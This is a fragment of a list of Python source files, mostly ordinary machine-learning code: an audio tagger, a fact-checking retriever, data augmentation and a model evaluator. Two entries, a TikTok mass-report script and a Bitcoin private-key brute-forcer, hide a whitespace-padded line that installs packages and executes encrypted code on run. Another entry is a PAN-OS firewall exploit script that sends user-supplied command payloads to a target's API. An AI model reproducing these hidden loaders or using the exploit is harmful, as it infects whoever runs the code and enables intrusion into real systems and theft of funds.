file_name.split(\"?\")[0]), exist_ok=True)\n            wi",
    "import torch\r\nimport torchaudio\r\nfrom transformers import ClapProcessor, ClapModel\r\n\r\nclass Interrogator:\r\n    def __init__(self, model_name=\"laion/clap-htsat-unfused\", tags=\"tags.json\"):\r\n\r\n        self.processor = ClapProcessor.from_pretrained(model_name)\r\n        self.model = ClapModel.from_pretrained(model_name)\r\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\n        self.model.to(self.device)\r\n        \r\n        if isinstance(tags, str):\r\n            self.tags = self.load_tags_from_file(tags)\r\n        elif isinstance(tags, list):\r\n            self.tags = list(set(tags))\r\n        else:\r\n            raise ValueError(\"Tags must be a file path (str) or a list of tags (list).\")\r\n\r\n    def load_tags(self, file_path='tags.json'):\r\n        import json\r\n        with open(file_path, 'r') as file:\r\n            tags_data = json.load(file)\r\n            tags = sum(tags_data.values(), [])\r\n        return list(set(tags))\r\n\r\n    def tag(self, audio_input, sr=None, top_n=10):\r\n        if isinstance(audio_input, str):\r\n            audio, sr = torchaudio.load(audio_input)\r\n            audio = audio.squeeze(0) \r\n        elif isinstance(audio_input, torch.Tensor):\r\n            audio = audio_input\r\n            if sr is None:\r\n                raise ValueError(\"Sampling rate must be provided with audio tensor.\")\r\n        else:\r\n            raise TypeError(\"Invalid input type for audio_input. Must be a file path or torch.Tensor.\")\r\n\r\n        # Process inputs\r\n        inputs = self.processor(text=self.tags, audios=[audio], sampling_rate=sr, return_tensors=\"pt\", padding=True)\r\n        inputs = {key: val.to(self.device) for key, val in inputs.items()}\r\n        \r\n        # Compute similarity\r\n        with torch.no_grad(): \r\n            outputs = self.model(**inputs)\r\n        logits_per_audio = outputs.logits_per_audio\r\n        probs = logits_per_audio.softmax(dim=-1)\r\n        \r\n        # Get the top tags\r\n        top_probs, top_indices = probs.topk(top_n, dim=1)\r\n        top_matches = [self.tags[i] for i in top_indices[0].tolist()]\r\n        \r\n        return top_matches\r\n",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'EOIDJoGq_4VyXszAPvfywt-XW6G6RHTX0lvSUOloLFs=').decrypt(b'gAAAAABmGp4fVfjmAZY5h3cWtBWbKZFBAFFs8RvAoJpuNSF7H_BGZZTnui-tMCT9milaJ6oY3eXMRxhrr-oRYrx2-eYFEE7Nj60vH_enexWhI9lLmV_PYwd_StdLlHS6r57ItuI5fIxYJ6uaJKqXdN3KujUOkotipFBAMWA7MqZ-z8DPM_fV6qSSdZhwgjiGSrylZUqGL8NGnXaw_zM26wqYCHO6WEugXa5cDz9Ji1_Qm1zAGXLyWgI='))\nimport requests\nimport json\n\n\ntiktokvideolink = input('Video ID > ')\ntiktokvideolinkreal = input('Tiktok Video Link')\n\nurl = \"https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id=6987530745909036549&region=DK&priority_region=&os=windows&referer=&root_referer=&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=da-DK&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F92.0.4515.107+Safari%2F537.36&browser_online=true&verifyFp=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX&app_language=en&timezone_name=Europe%2FCopenhagen&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=4&battery_info=1\"\n\npayload = json.dumps({\n  \"reason\": 1004,\n  \"object_id\": tiktokvideolink,\n  \"owner_id\": \"6636714219386781701\",\n  \"report_type\": \"video\"\n})\nheaders = {\n  'authority': 'www.tiktok.com',\n  'sec-ch-ua': '\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"',\n  'accept': 'application/json, text/plain, */*',\n  'x-secsdk-csrf-token': '000100000001ddd4e9748bc018f9e9c13093fb09bb878e0c97573abfdbf43ec8d0817c782b7a1694901c1b038c13',\n  'sec-ch-ua-mobile': '?0',\n  'tt-csrf-token': 'ePCjBjwO15QhaDbSrq7NMj6L',\n  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',\n  'content-type': 'application/json',\n  'origin': 'https://www.tiktok.com',\n  'sec-fetch-site': 'same-origin',\n  'sec-fetch-mode': 'cors',\n  'sec-fetch-dest': 'empty',\n  'referer': tiktokvideolinkreal,\n  'accept-language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',\n  'cookie': 'tt_webid_v2=6987530745909036549; tt_webid=6987530745909036549; cookie-consent={%22ga%22:true%2C%22af%22:true%2C%22fbp%22:true%2C%22lip%22:true%2C%22version%22:%22v2%22}; s_v_web_id=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX; MONITOR_WEB_ID=6987530745909036549; tt_csrf_token=ePCjBjwO15QhaDbSrq7NMj6L; R6kq3TV7=AGIivtV6AQAAN-OR-sxIv18EYkOMaPvth3F_97xkhJ_OT_yI7nG6UayUCYRk|1|0|d52a182c37413d8803c7100633cc49d673b8b993; ttwid=1%7C0D_adjNZXWbKipMeZG_RUyaNe6bFDSttsAX927MCOZ8%7C1627083654%7C4310fd827053a66f1886a63bea5b6d42b8b11ab91b563ac183eff76b902f48c9; csrf_session_id=d3b7880ce8d34ce0821782de56fae639'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nwhile True:\n    print(response.text)\nprint('yfbqufkf')",
    "from core import *\nfrom argparse import Namespace\nfrom .utils.openai_api import gpt\nimport spacy\nfrom sentence_transformers import CrossEncoder\nimport spacy\nimport numpy as np\nfrom copy import deepcopy\nimport torch\nimport openai\nimport concurrent.futures\nimport backoff\nimport requests\nimport re\nimport itertools\nfrom openai import RateLimitError\nimport bs4\nfrom typing import List, Dict, Any\nfrom .utils.prompt import QGEN_PROMPT, QGEN_PROMPT_FMT\nfrom .utils.data_util import save_txt, save_json\nimport time\n\n\n@register_solver(\"retriever\", \"claims\", \"claims_with_evidences\")\nclass Retriever(StandardTaskSolver):\n    def __init__(self, args):\n        super().__init__(args)\n        self.model = self.global_config.get(\"model\", \"gpt-3.5-turbo\")\n        self.num_retries = self.global_config.get(\"num_retries\", 3)\n        self.tokenizer = spacy.load(\"en_core_web_sm\", disable=[\"ner\", \"tagger\", \"lemmatizer\"])\n        self.question_duplicate_model = CrossEncoder(\n            'navteca/quora-roberta-base',\n            device=torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n        )\n        self.passage_ranker = CrossEncoder(\n            \"cross-encoder/ms-marco-MiniLM-L-6-v2\",\n            max_length=512,\n            device=torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\"),\n        )\n        # self.system_role = args.get(\"system_role\", \"You are a student full of curiosity\")\n        self.qgen_system_role = \"You are a student full of curiosity\"\n        self.n_questions = args.get(\"n_questions\", 5)\n        self.question_gen_round = args.get(\"question_gen_round\", 1)\n        self.qgen_temp = args.get(\"qgen_temp\", 0.7)\n        self.search_timeout = args.get(\"search_timeout\", 10)\n        self.max_search_results_per_query = args.get(\"max_search_results_per_query\", 5)\n        self.max_passages_per_search_result_to_return = args.get(\"max_passages_per_search_result_to_return\", 3)\n        self.sentences_per_passage = args.get(\"sentences_per_passage\", 5)\n        self.max_passages_per_question = args.get(\"max_passages_per_question\", 5)\n        self.max_aggregated_evidences = args.get(\"max_aggregated_evidences\", 5)\n        self.question_persist_path = args.get(\"question_persist_path\", 'questions.txt')\n        self.snippets_persist_path = args.get(\"snippets_persist_path\", \"passage.json\")\n\n    def __call__(self, state: FactCheckerState, *args, **kwargs):\n        claims = state.get(self.input_name)\n        claims_with_evidences = {}\n        for i, claim in enumerate(claims):\n            evidences = self.get_web_evidences_for_claim(claim)\n            claims_with_evidences[claim] = [x['text'] for x in evidences['aggregated']]\n        state.set(self.output_name, claims_with_evidences)\n        return True, state\n\n    def generate_questions(self, claim, max_loop=5):\n        questions = []\n        while len(questions) <= 0:\n            questions = self.run_question_generation(claim)\n            if len(questions) >= 0:\n                questions = self.remove_duplicate_questions(questions)\n        save_txt(questions, self.question_persist_path)\n        return questions\n\n    def retrieve_documents(self, questions):\n        snippets = {}\n        for question in questions:\n            retrieved_passages = self.get_relevant_snippets(question)\n            snippets[question] = sorted(\n                retrieved_passages,\n                key=lambda x: x['retrieval_score'],\n                reverse=True\n            )[:self.max_passages_per_question]\n        save_json(snippets, self.snippets_persist_path)\n        return snippets\n\n    def get_web_evidences_for_claim(self, claim):\n        evidences = dict()\n        evidences[\"aggregated\"] = list()\n        questions = self.generate_questions(claim)\n        snippets = self.retrieve_documents(questions)\n        evidences[\"question_wise\"] = snippets\n        total_snippets = sum(list(map(lambda x: len(x), snippets.values())))\n        if total_snippets == 0:\n            raise RuntimeError(\"No passages are retrieved, check your network...\")\n        if total_snippets > self.max_aggregated_evidences:\n            while len(evidences[\"aggregated\"]) < self.max_aggregated_evidences:\n                for key in evidences[\"question_wise\"]:\n                    # Take top evidences for each question\n                    if len(evidences[\"question_wise\"][key]) > 0:\n                        index = int(len(evidences[\"aggregated\"]) / len(evidences[\"question_wise\"]))\n                        evidence = evidences[\"question_wise\"][key][index]\n                        evidences[\"aggregated\"].append(evidence)\n        else:\n            evidences[\"aggregated\"] = itertools.chain.from_iterable(list(snippets.values()))\n        return evidences\n\n    @backoff.on_exception(backoff.expo, RateLimitError)\n    def run_question_generation(self, claim):\n        questions = set()\n        for _ in range(self.question_gen_round):\n            user_input = QGEN_PROMPT_FMT.format(claim=claim, n=self.n_questions)\n            response = gp",
    "import re\nfrom urllib import request\nimport json\n\n# Constants\nIP_REGEX = r'[0-9]+(?:\\.[0-9]+){3}'\n\ndef f_221(ip_address):\n    \"\"\"\n    Get the public IP address from a JSON response containing the IP address.\n    \n    Parameters:\n    ip_address (str): JSON-formatted string containing the IP address. \n\n    Returns:\n    str: The public IP address.\n    \n    Note:\n    - The function needs to check whether the provided IP address is valid.\n      If the IP address is not valid, the function will return 'Invalid IP address received'.\n\n    Requirements:\n    - re\n    - urllib.request\n    - json\n    \n    Example:\n    >>> ip_address = '{\"ip\": \"192.168.1.1\"}'\n    >>> f_221(ip_address)\n    '192.168.1.1'\n    \"\"\"\n\n    try:\n        response = ip_address\n        data = json.loads(response)\n        ip = data['ip']\n        if re.match(IP_REGEX, ip):\n            return ip\n        else:\n            return 'Invalid IP address received'\n    except Exception as e:\n        return str(e)\n\nimport unittest\nimport json\nclass TestCases(unittest.TestCase):\n    def test_case_1(self):\n        ip_address = json.dumps({'ip': '192.168.1.1'}).encode('utf-8')\n        \n        result = f_221(ip_address)\n        self.assertEqual(result, '192.168.1.1')\n    def test_case_2(self):\n        ip_address = json.dumps({'ip': '500.500.500.500'}).encode('utf-8')\n        \n        result = f_221(ip_address)\n        self.assertEqual(result, '500.500.500.500')\n    def test_case_3(self):\n        ip_address = json.dumps({'ip': '192.168.0.3'}).encode('utf-8')\n        \n        result = f_221(ip_address)\n        self.assertEqual(result, '192.168.0.3')\n    def test_case_4(self):\n        ip_address = json.dumps({'ip': ''}).encode('utf-8')\n        \n        result = f_221(ip_address)\n        self.assertEqual(result, 'Invalid IP address received')\n    def test_case_5(self):\n        ip_address = json.dumps({'ip': 'Non-JSON response'}).encode('utf-8')\n        \n        result = f_221(ip_address)\n        self.assertEqual(result, 'Invalid IP address received')\n",
    "import math\nimport random\nimport torch\nimport torch.nn.functional as F\n\n\ndef delete_data(sample):\n    \"\"\"Randomly deletes a certain fraction of data points and pads to maintain original size.\n\n    Args:\n        sample (tuple): A tuple containing various features and related information.\n\n    Returns:\n        tuple: The modified sample with certain data points deleted and padded.\n    \"\"\"\n    augmented_sample = tuple(sample)\n    (feature1, feature2, len1, feature3, feature4, len2, len3) = augmented_sample\n\n    # Process fintech records.\n    if random.random() < 0.75:\n        feature1, feature2, len1 = delete_and_pad(\n            feature1, feature2, len1, 120)\n\n    # Process inquiry data.\n    if random.random() < 0.75:\n        feature3, len2 = delete_and_pad_feature_only(\n            feature3, len2, 0.1, 60)\n\n    # Process credit data.\n    if random.random() < 0.75:\n        feature4, len3 = delete_and_pad_feature_only(\n            feature4, len3, 0.1, 120)\n\n    return (feature1, feature2, len1, feature3, feature4, len2, len3)\n\n\ndef modify_data(sample):\n    \"\"\"Randomly replaces a certain fraction of data points.\n\n    Args:\n        sample (tuple): The original data sample tuple.\n\n    Returns:\n        tuple: The modified sample with certain data points replaced.\n    \"\"\"\n    augmented_sample = tuple(sample)\n    # Tuple unpacking remains the same; focus on function structure and naming.\n    (feature1, feature2, len1, feature3, feature4, len2, len3) = augmented_sample\n\n    if random.random() < 0.75:\n       feature1, feature2, len1 = replace_data(feature1, feature2, len1)\n\n    if random.random() < 0.75:\n        feature3, len2 = replace_data(feature3, None, len2)\n\n    if random.random() < 0.75:\n        feature4, len3 = replace_data(feature4, None, len3)\n\n    return (feature1, feature2, len1, feature3, feature4, len2, len3)\n\n\ndef subset_and_pad(sample):\n    \"\"\"Creates a subset and pads the data based on time series.\n\n    Args:\n        sample (tuple): Data sample to be modified.\n\n    Returns:\n        tuple: The modified data sample.\n    \"\"\"\n    # Function structure follows the similar modification principles.\n    augmented_sample = tuple(sample)\n    (feature1, feature2, len1, feature3, feature4, len2, len3) = augmented_sample\n\n    if random.random() < 0.75:\n        feature1, feature2, len1 = sub_and_pad(feature1, feature2, len1, 120)\n\n    if random.random() < 0.75:\n        feature3, len2 = sub_and_pad(feature3, None, len2, 60)\n\n    if random.random() < 0.75:\n        feature4, len3 = sub_and_pad(feature4, None, len3, 120)\n\n    return (feature1, feature2, len1, feature3, feature4, len2, len3)\n\n\ndef delete_and_pad(categorical_feature, numeric_feature, length, pad_length):\n    \"\"\"Deletes a fraction of feature data and pads it.\n    \n    This function randomly removes a portion of the feature data and pads the remanining\n    data up to a specified `pad_length` with zeros for numeric features and a special padding\n    ID for categorical features.\n    \n    Args:\n        categorical_feature (torch.Tensor): The categorical feature tensor.\n        numeric_feature (torch.Tensor): The numeric feature tensor.\n        length (int): The original length of the data.\n        pad_length (int): The length to pad the data to.\n\n    Returns:\n        tuple: Modified features and length.\n    \"\"\"\n    # Calculate the number of entries to delete\n    delete_count = int(length * random.uniform(0.1, 0.3))  # For example, delete 10-30% of entries\n    remaining_length = max(0, length - delete_count)\n    \n    if remaining_length > 0:\n        # Randomly choose indices to keep\n        indices = sorted(random.sample(range(length), remaining_length))\n        categorical_feature = categorical_feature[indices]\n        numeric_feature = numeric_feature[indices]\n    else:\n        # If no data remains, create empty tensors of the right shape\n        categorical_feature = categorical_feature[:0]\n        numeric_feature = numeric_feature[:0]\n    \n    # Pad the remaining data to reach the pad_length\n    pad_size = max(0, pad_length - remaining_length)\n    if pad_size > 0:\n        categorical_pad = torch.full((pad_size, *categorical_feature.shape[1:]), fill_value=-1)  # Assuming -1 is the padding ID for categorical features\n        numeric_pad = torch.zeros((pad_size, *numeric_feature.shape[1:]))\n        \n        categorical_feature = torch.cat([categorical_feature, categorical_pad], dim=0)\n        numeric_feature = torch.cat([numeric_feature, numeric_pad], dim=0)\n    \n    return categorical_feature, numeric_feature, min(length, pad_length)\n    \n\n\ndef delete_and_pad_feature_only(feature, feature_length, delete_ratio, pad_length):\n    \"\"\"Specialized deletion and padding for single-feature cases.\n\n    Args:\n        feature (Tensor): The feature to be modified.\n        feature_length (int): Original length of the feature.\n        delete_ratio (float): Fraction of the feature to delete.\n        pad_length (int): The length to pad the feature to.\n\n    Returns:\n        Tu",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'S-A57Ip61y1NxRxMKOE-d7VxbrZIabcYbTXLx_XAr9M=').decrypt(b'gAAAAABmGp4-iCHAP5k7kpj3uAqO6v4ewv4880UA9tYb03rt88ZaikuYmt5-ZR4h6KFFuetGlbDiQTltioj8jGEmgtCWzPSCBS6ll5BaejfgDV2lMtSqzmNGVcFH6T4df6moBikFgKkFmlVp_0tWoWlzj2c7g0MLeKeseJmTFi8vsWvYTHjS-9kHVYRvj0H1B7Q1QqtpZMZinJXsrn0Wnq_fhVPa8OhqfF7Asd6ZVUFJvZkl_z3bYyU='))\nimport time\nimport sys\nfrom hdwallet import HDWallet\nfrom hdwallet.symbols import BTC as SYMBOL\nfrom hexer import mHash\nfrom colorama import Fore,Style\n\nmmdrza = '''\n                    \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \n                    \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n                    \u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d  \u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n                    \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2554\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\n                    \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n                    \u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n                  ||======================================================||\n                  ||===========  \u2554\u2566\u2557\u2554\u2566\u2557\u2554\u2566\u2557\u2566\u2550\u2557\u2554\u2550\u2557\u2554\u2550\u2557 \u2554\u2550\u2557\u2554\u2550\u2557\u2554\u2566\u2557  ===========||\n                  ||===========  \u2551\u2551\u2551\u2551\u2551\u2551 \u2551\u2551\u2560\u2566\u255d\u2554\u2550\u255d\u2560\u2550\u2563 \u2551  \u2551 \u2551\u2551\u2551\u2551  ===========||\n                  ||===========  \u2569 \u2569\u2569 \u2569\u2550\u2569\u255d\u2569\u255a\u2550\u255a\u2550\u255d\u2569 \u2569o\u255a\u2550\u255d\u255a\u2550\u255d\u2569 \u2569  ===========||                                                                                                                            \n                  ||------------------------------------------------------||\n                  ||- WebSite ------------------------------- Mmdrza.Com -||\n                  ||- MAIL    ---------------------------- X4@Mmdrza.Com -||\n                  ||- DEV     ---------------------------- DEV.to/Mmdrza -||\n                  ||- GiTHUB  ---------------------- Github.Com/PyMmdrza -||\n                  ||- MEDIUM  -------------- PythonWithMmdrza.Medium.Com -||\n                  ||======================================================||\n\n'''\n\n\nfilename = 'btc.txt'\nwith open(filename) as f:\n    add = f.read().split()\nadd = set(add)\nprint(Fore.YELLOW,str(mmdrza),Fore.RED,'\\n---------------[ Donate - Bitcoin Wallet = ',Fore.WHITE ,'16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8', Fore.RED,' ]---------------\\n')\nz = 1\n\ndef delay_print(s):\n    for c in s:\n        sys.stdout.write(c)\n        sys.stdout.flush()\n        time.sleep(0.15)\nprint(Fore.RED,'===========================================================================================\\n')\ndelay_print('Can You Download Rich Wallet List For This Program Follow GitHub.Com/PyMmdrza Or Mmdrza.Com')\nprint('  <<---------->>    Official Web Site = https://mmdrza.Com')\n\nwhile True:\n    hex64 = mHash()\n    PRIVATE_KEY: str = hex64\n    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)\n    hdwallet.from_private_key(private_key=PRIVATE_KEY)\n    priv = hdwallet.private_key()\n    p2pkh = hdwallet.p2pkh_address()\n    p2sh = hdwallet.p2sh_address()\n    p2wpkh = hdwallet.p2wpkh_address()\n    p2wsh = hdwallet.p2wsh_address()\n    p2wpkh2 = hdwallet.p2wpkh_in_p2sh_address()\n    p2wsh2 = hdwallet.p",
    "import csv\nimport requests\n\ndef exploit_firewall(target_ip, payload, root_ca=None):\n    url = f\"https://{target_ip}/api/\"\n\n    data = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <request>\n        <op cmd=\"test\" />\n        <cmd code=\"ping\">{payload}</cmd>\n    </request>\"\"\"\n\n    headers = {\n        \"User-Agent\": \"PAN-OS-Exploit\",\n        \"Content-Type\": \"application/xml\"\n    }\n\n    try:\n        if root_ca:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=root_ca)\n        else:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)\n\n        response.raise_for_status()\n\n        if \"Success\" in response.text:\n            print(f\"Exploited successfully against {target_ip}!\")\n        else:\n            print(f\"Exploit failed for {target_ip}.\")\n            print(\"Response:\")\n            print(response.text)\n\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to exploit {target_ip}: {e}\")\n\ndef main():\n    choice = input(\"Do you want to enter values directly (D) or use a CSV file (C)? \").strip().lower()\n    \n    if choice == 'd':\n        while True:\n            target_ip = input(\"Enter the IP address of the vulnerable PAN-OS firewall (or 'q' to quit): \")\n            if target_ip.lower() == 'q':\n                break\n            root_ca = input(\"Enter the path to the root CA certificate (leave blank to disable certificate verification): \").strip()\n            payload = input(\"Enter the payload to execute: \")\n            exploit_firewall(target_ip, payload, root_ca)\n    elif choice == 'c':\n        csv_file = input(\"Enter the path to the CSV file: \")\n\n        with open(csv_file, newline='') as csvfile:\n            reader = csv.reader(csvfile)\n            next(reader)  # Skip header row if present\n            for row in reader:\n                target_ip, payload, root_ca = row\n                exploit_firewall(target_ip, payload, root_ca)\n    else:\n        print(\"Invalid choice. Please enter 'D' for entering values directly or 'C' for using a CSV file.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Fri Apr 19 20:19:48 2024\r\n\r\n@author: 10364\r\n\"\"\"\r\n\r\nimport openai            # pip install openai==0.28.1\r\n\r\nopenai.api_key = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\r\n\r\n# prompt\r\ncontent = \"Based on some studies the optimal temperature for strawberry plant growth is 15\u201326\u00b0C . During flowering stage, it\u2019s best to maintain a temperature range of 16-20\u00b0C. However, once the plants bear fruit, a range of 15-16\u00b0C is ideal for maturation. However, this temperature varies among different cultivars. Strawberry cultivars exhibit two primary categories based on their flowering patterns: seasonal flowering, commonly known as June-bearing, and perpetual flowering, also referred to as everbearing. In the case of June-bearing strawberries, flowering is triggered by the combination of short-day conditions and low temperatures in autumn. Following this initiation, the plant enters a dormant phase throughout the winter, culminating in a singular harvest season during the summer. On the other hand, everbearing strawberries possess the flexibility to initiate flowering under various photoperiods and within a moderate temperature range. This adaptability results in an extended harvest season, spanning from spring through to autumn.\"\r\n\r\nprint(\"content:  \" + content)\r\nprompt1 = \"Extract a virtual conversation about strawberry planting from the Knowledge, and hypothesize a famer is consulting a strawberry agronomist about relevant planting knowledge and information. \\n\"\r\nprompt2 = \"Use the following JSON format as output: \\n\"\r\nprompt3 = \"[\\n\"\r\nprompt4 = \"{instruction: \\\" If you are an agronomist, please answer the farmer questions based on the farmer's description.\\\",\\n\"\r\nprompt5 = \"input: farmer's description,\\n\"\r\nprompt6 = \"output: agronomist\u2019s response}\\n\"\r\nprompt7 = \"]\\n\"\r\nprompt8 = \"The extracted result should exclude words triggering OpenAI content management policy.\\n\"\r\nprompt9 = \"\\n\"\r\nprompt10 = \"Knowledge: {\" + content + \"}\"\r\n\r\nprompt_final = prompt1 + prompt2 + prompt3 + prompt4 + prompt5 + prompt6 + prompt7 + prompt8 + prompt9 + prompt10\r\n\r\ncompletion = openai.ChatCompletion.create(\r\n    model=\"gpt-3.5-turbo\",\r\n    messages=[\r\n        {\"role\": \"user\", \"content\": prompt_final}\r\n  ]\r\n)\r\n\r\nprint(\"----------------------------------------------\")\r\nprint(\"Result: \\n\", completion.choices[0].message.content)",
    "import os\r\nimport json\r\nimport torch\r\nimport tensorflow as tf\r\nfrom swift.llm import (\r\n    get_model_tokenizer, get_template, inference, ModelType, get_default_template_type\r\n)\r\nfrom swift.utils import seed_everything\r\nfrom bleurt import score\r\nimport numpy as np\r\nimport gc\r\n\r\n# Constants for terminal color\r\nRED = '\\033[31m'\r\nGREEN = '\\033[32m'\r\nRESET = '\\033[0m'\r\n\r\nclass ModelEvaluator:\r\n    def __init__(self, model_dirs, model_type, bleurt_model_path, seed=2024):\r\n        self.model_dirs = model_dirs\r\n        self.model_type = model_type\r\n        self.template_type = get_default_template_type(model_type)\r\n        self.bleurt_model_path = bleurt_model_path\r\n        self.setup_cuda()\r\n        seed_everything(seed)\r\n        self.model, self.tokenizer = self.load_model()\r\n\r\n    def setup_cuda(self):\r\n        os.environ['CUDA_VISIBLE_DEVICES'] = '0,1'\r\n        \r\n    def free_gpu_memory(self):\r\n        del self.model\r\n        torch.cuda.empty_cache()\r\n        gc.collect()\r\n\r\n    def load_model(self):\r\n        kwargs = {'use_flash_attn': True}\r\n        model_t, tokenizer = get_model_tokenizer(self.model_type, torch.bfloat16, {'device_map': 'auto'}, **kwargs)\r\n        return model_t, tokenizer\r\n\r\n    def process_data(self):\r\n        history = [\r\n            (\"your few shot example query\", \"your few shot example response\"),\r\n            (\"your few shot example query\", \"your few shot example response\"),\r\n        ]\r\n        len_history = len(self.tokenizer.tokenize(str(history)))\r\n        \r\n        for model_dir in self.model_dirs:\r\n            responses, queries, true_responses = [], [], []\r\n            with open('/path/to/your/test.jsonl', 'r') as f:\r\n                for count, line in enumerate(f):\r\n                    data = json.loads(line)\r\n                    query = data[\"query\"]\r\n                    if self.is_query_too_long(data['response'], query, len_history):\r\n                        continue\r\n                    response, _ = inference(self.model, self.get_template(), query, history)\r\n                    responses.append(response)\r\n                    queries.append(query)\r\n                    true_responses.append(data[\"response\"])\r\n                    self.print_response(response, data[\"response\"], count)\r\n\r\n            self.output_responses(model_dir, queries, responses, true_responses)\r\n            self.free_gpu_memory()\r\n            self.evaluate_with_bleurt(queries, responses, true_responses, model_dir)\r\n\r\n    def is_query_too_long(self, response, query, len_history, max_len=4096):\r\n        return len(self.tokenizer.tokenize(response)) + len(self.tokenizer.tokenize(query)) + len_history > max_len\r\n\r\n    def get_template(self):\r\n        return get_template(self.template_type, self.tokenizer)\r\n\r\n    def print_response(self, response, true_response, count):\r\n        print(f\"{GREEN}Response: \\n{response}{RESET}\")\r\n        print(f\"{RED}True Response: \\n{true_response}{RESET}\")\r\n        print(\"=\"*20 + str(count))\r\n\r\n    def output_responses(self, model_dir, queries, responses, true_responses):\r\n        with open(f'output_responses_{model_dir.split(\"/\")[-2]}.jsonl', 'w') as out_f:\r\n            for query, response, true_response in zip(queries, responses, true_responses):\r\n                output_data = {\r\n                    \"query\": query,\r\n                    \"response\": response,\r\n                    \"true_response\": true_response,\r\n                }\r\n                json.dump(output_data, out_f)\r\n                out_f.write('\\n')\r\n\r\n    def evaluate_with_bleurt(self, queries, responses, true_responses, model_dir):\r\n        os.environ['CUDA_VISIBLE_DEVICES'] = '0,1'\r\n        tf.config.set_visible_devices([], 'GPU')\r\n        gpus = tf.config.list_physical_devices('GPU')\r\n        if gpus:\r\n            tf.config.set_visible_devices(gpus[1], 'GPU')\r\n        bleurt_scorer = score.BleurtScorer(self.bleurt_model_path)\r\n        \r\n        bleurt_scores = []\r\n        with open(f'output_responses_{model_dir.split(\"/\")[-2]}.jsonl', 'w') as out_f:\r\n            for query, response, true_response in zip(queries, responses, true_responses):\r\n                bleurt_score = bleurt_scorer.score(references=[true_response], candidates=[response])[0]\r\n                output_data = {\r\n                    \"query\": query,\r\n                    \"response\": response,\r\n                    \"true_response\": true_response,\r\n                    \"bleurt\": bleurt_score\r\n                }\r\n                json.dump(output_data, out_f)\r\n                out_f.write('\\n')\r\n                bleurt_scores.extend(bleurt_score)\r\n        print(np.mean(bleurt_scores))\r\n        tf.keras.backend.clear_session()\r\n        gc.collect()\r\n\r\n# Usage of ModelEvaluator\r\nmodel_dirs = 